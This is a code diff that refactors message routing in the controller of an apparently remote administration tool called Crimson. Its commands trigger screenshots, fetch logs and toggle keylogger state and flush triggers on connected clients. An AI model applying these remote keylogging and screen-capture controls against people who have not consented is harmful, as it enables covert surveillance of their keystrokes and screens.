@@ -28,10 +28,11 @@ import java.util.List;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import com.subterranean_security.crimson.core.net.TimeoutConstants;
 import com.subterranean_security.crimson.core.net.MessageFuture.MessageTimeout;
+import com.subterranean_security.crimson.core.net.TimeoutConstants;
 import com.subterranean_security.crimson.core.store.LcvidStore;
 import com.subterranean_security.crimson.core.store.NetworkStore;
+import com.subterranean_security.crimson.core.store.ProfileStore;
 import com.subterranean_security.crimson.core.util.FileUtil;
 import com.subterranean_security.crimson.core.util.IDGen;
 import com.subterranean_security.crimson.proto.core.Generator.ClientConfig;
@@ -39,8 +40,8 @@ import com.subterranean_security.crimson.proto.core.Generator.GenReport;
 import com.subterranean_security.crimson.proto.core.Misc.AuthMethod;
 import com.subterranean_security.crimson.proto.core.Misc.Outcome;
 import com.subterranean_security.crimson.proto.core.net.sequences.Chat.RQ_Chat;
-import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RQ_CreateAuthMethod;
-import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RQ_RemoveAuthMethod;
+import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RQ_CreateAuthGroup;
+import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RQ_RemoveAuthGroup;
 import com.subterranean_security.crimson.proto.core.net.sequences.ClientControl.RQ_ChangeSetting;
 import com.subterranean_security.crimson.proto.core.net.sequences.Generator.RQ_Generate;
 import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.RQ_KeyUpdate;
@@ -54,7 +55,6 @@ import com.subterranean_security.crimson.proto.core.net.sequences.State.RQ_Chang
 import com.subterranean_security.crimson.proto.core.net.sequences.State.StateType;
 import com.subterranean_security.crimson.proto.core.net.sequences.Update.RQ_GetClientConfig;
 import com.subterranean_security.crimson.universal.Universal;
-import com.subterranean_security.crimson.viewer.store.ViewerProfileStore;
 import com.subterranean_security.crimson.viewer.ui.screen.generator.Report;
 import com.subterranean_security.crimson.viewer.ui.screen.main.MainFrame;
 
@@ -72,10 +72,10 @@ public final class ViewerCommands {
 					RQ_ChangeServerState.newBuilder().setNewState(st)), TimeoutConstants.DEFAULT);
 			if (m == null) {
 				outcome.setResult(false).setComment("Request timeout");
-			} else if (!m.getRsChangeServerState().getOutcome().getResult()) {
+			} else if (!m.getRsOutcome().getResult()) {
 
-				outcome.setResult(false).setComment(!m.getRsChangeServerState().getOutcome().getComment().isEmpty()
-						? m.getRsChangeServerState().getOutcome().getComment() : "no comment");
+				outcome.setResult(false).setComment(
+						!m.getRsOutcome().getComment().isEmpty() ? m.getRsOutcome().getComment() : "no comment");
 
 			} else {
 				outcome.setResult(true);
@@ -93,13 +93,13 @@ public final class ViewerCommands {
 		log.debug("Changing client state: {}", st.toString());
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
-			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid)
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid)
 					.setRqChangeClientState(RQ_ChangeClientState.newBuilder().setNewState(st)),
 					TimeoutConstants.DEFAULT);
 			if (m == null) {
 				outcome.setResult(false).setComment("Request timeout");
 			} else {
-				return m.getRsChangeClientState().getOutcome();
+				return m.getRsOutcome();
 			}
 		} catch (InterruptedException e) {
 			outcome.setResult(false).setComment("Interrupted");
@@ -113,13 +113,13 @@ public final class ViewerCommands {
 	public static Outcome createAuthMethod(AuthMethod at) {
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
-			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRqCreateAuthMethod(
-					RQ_CreateAuthMethod.newBuilder().setAuthMethod(at)), TimeoutConstants.DEFAULT);
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg())
+					.setRqCreateAuthGroup(RQ_CreateAuthGroup.newBuilder().setAuthMethod(at)), TimeoutConstants.DEFAULT);
 			if (m == null) {
 				outcome.setResult(false).setComment("Request timeout");
-			} else if (!m.getRsCreateAuthMethod().getOutcome().getResult()) {
-				outcome.setResult(false).setComment(!m.getRsCreateAuthMethod().getOutcome().getComment().isEmpty()
-						? m.getRsCreateAuthMethod().getOutcome().getComment() : "no comment");
+			} else if (!m.getRsOutcome().getResult()) {
+				outcome.setResult(false).setComment(
+						!m.getRsOutcome().getComment().isEmpty() ? m.getRsOutcome().getComment() : "no comment");
 
 			} else {
 				outcome.setResult(true);
@@ -137,17 +137,13 @@ public final class ViewerCommands {
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
 			Message m = NetworkStore.route(
-					Message.newBuilder().setRqRemoveAuthMethod(RQ_RemoveAuthMethod.newBuilder().setId(id)),
+					Message.newBuilder().setRqRemoveAuthGroup(RQ_RemoveAuthGroup.newBuilder().setId(id)),
 					TimeoutConstants.DEFAULT);
 			if (m == null) {
 				outcome.setResult(false).setComment("Request timeout");
-			} else if (!m.getRsRemoveAuthMethod().getResult()) {
-				outcome.setResult(false).setComment(
-						m.getRsRemoveAuthMethod().hasComment() ? m.getRsRemoveAuthMethod().getComment() : "no comment");
-
-			} else {
-				outcome.setResult(true);
 			}
+
+			return m.getRsOutcome();
 		} catch (InterruptedException e) {
 			outcome.setResult(false).setComment("Interrupted");
 		} catch (MessageTimeout e) {
@@ -220,7 +216,7 @@ public final class ViewerCommands {
 	public static ClientConfig getClientConfig(int cid) {
 		log.debug("Retrieving client config");
 		try {
-			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid)
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid)
 					.setRqGetClientConfig(RQ_GetClientConfig.newBuilder()), TimeoutConstants.DEFAULT);
 			if (m != null) {
 				return m.getRsGetClientConfig().getConfig();
@@ -274,7 +270,7 @@ public final class ViewerCommands {
 	public static Outcome quickScreenshot(int cid) {
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
-			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid)
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid)
 					.setRqQuickScreenshot(RQ_QuickScreenshot.newBuilder()), TimeoutConstants.DEFAULT);
 			File file = new File(
 					System.getProperty("user.home") + "/Crimson/" + screenshotDate.format(new Date()) + ".jpg");
@@ -301,7 +297,7 @@ public final class ViewerCommands {
 
 	public static LogFile getLog(int cid, LogType type) {
 		try {
-			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid)
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid)
 					.setRqLogs(RQ_Logs.newBuilder().setLog(type)), TimeoutConstants.DEFAULT);
 
 			if (m != null) {
@@ -319,7 +315,7 @@ public final class ViewerCommands {
 
 	public static List<LogFile> getLogs(int cid) {
 		try {
-			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid)
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid)
 					.setRqLogs(RQ_Logs.newBuilder()), TimeoutConstants.DEFAULT);
 
 			if (m != null) {
@@ -339,25 +335,25 @@ public final class ViewerCommands {
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
 			Message m = NetworkStore.route(
-					Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid).setRqChangeSetting(rq),
+					Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid).setRqChangeSetting(rq),
 					TimeoutConstants.DEFAULT);
 
 			if (m == null) {
 				outcome.setResult(false).setComment("Request timed out");
 			} else {
-				if (m.getRsChangeSetting().getResult().getResult()) {
+				if (m.getRsOutcome().getResult()) {
 					// update profile
 					if (rq.hasKeyloggerState()) {
-						ViewerProfileStore.getClient(cid).setKeyloggerState(rq.getKeyloggerState());
+						ProfileStore.getClient(cid).setKeyloggerState(rq.getKeyloggerState());
 					}
 					if (rq.hasFlushMethod()) {
-						ViewerProfileStore.getClient(cid).setKeyloggerTrigger(rq.getFlushMethod());
+						ProfileStore.getClient(cid).setKeyloggerTrigger(rq.getFlushMethod());
 					}
 					if (rq.hasFlushValue()) {
-						ViewerProfileStore.getClient(cid).setKeyloggerTriggerValue(rq.getFlushValue());
+						ProfileStore.getClient(cid).setKeyloggerTriggerValue(rq.getFlushValue());
 					}
 				}
-				return m.getRsChangeSetting().getResult();
+				return m.getRsOutcome();
 			}
 
 		} catch (InterruptedException e) {
@@ -372,7 +368,7 @@ public final class ViewerCommands {
 	public static Outcome openChat(int cid, boolean prompt) {
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
-			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid)
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid)
 					.setRqChat(RQ_Chat.newBuilder()), TimeoutConstants.DEFAULT);
 
 			if (m == null) {
